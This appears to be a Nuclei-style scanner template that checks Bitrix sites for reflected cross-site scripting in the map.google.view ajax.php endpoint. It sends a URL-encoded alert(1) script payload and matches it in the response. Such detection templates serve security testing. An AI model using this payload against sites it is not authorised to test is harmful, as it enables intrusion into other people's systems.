id: bitrix-map-google-xss

info:
  name: Bitrix XSS in map.google.view
  author: clevergod
  severity: medium
  tags: bitrix,xss

requests:
  - method: GET
    path:
      - "{{BaseURL}}/bitrix/components/bitrix/map.google.view/ajax.php?param=%3Cscript%3Ealert(1)%3C/script%3E"
    matchers:
      - type: word
        part: body
        words:
          - "<script>alert(1)</script>"